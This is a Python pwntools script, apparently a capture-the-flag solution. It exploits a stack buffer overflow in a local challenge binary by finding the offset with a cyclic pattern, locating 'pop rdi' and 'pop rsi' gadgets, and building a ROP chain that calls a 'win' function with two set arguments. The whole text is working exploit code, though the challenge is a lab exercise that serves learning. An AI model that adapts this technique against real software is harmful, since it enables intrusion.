from pwn import *

context.binary = elf = ELF('./chall')
context.log_level = 'debug' 

p = process(elf.path) 

# ========================= Finding the offset:
payload = cyclic(200)
p.sendline(payload)
p.wait()  
core = p.corefile 
offset = cyclic_find(core.read(core.rsp, 4))
log.success(f"Offset found: {offset}")
p.close()

# ========================= Finding win's address:
win = elf.symbols["win"] 
log.success(f"win() address: {hex(win)}")

# ========================= Finding the necessary gadgets:
rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.success(f"pop rdi ; ret: {hex(rdi)}")
log.success(f"pop rsi ; ret: {hex(rsi)}")

# ========================= Arguments to pass to win function:
arg1 = 0xcafebabe
arg2 = 0xcafed00d

# ========================= Final payload:
payload = flat( 
    b'A' * offset,
    rdi, arg1,
    rsi, arg2,
    win
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
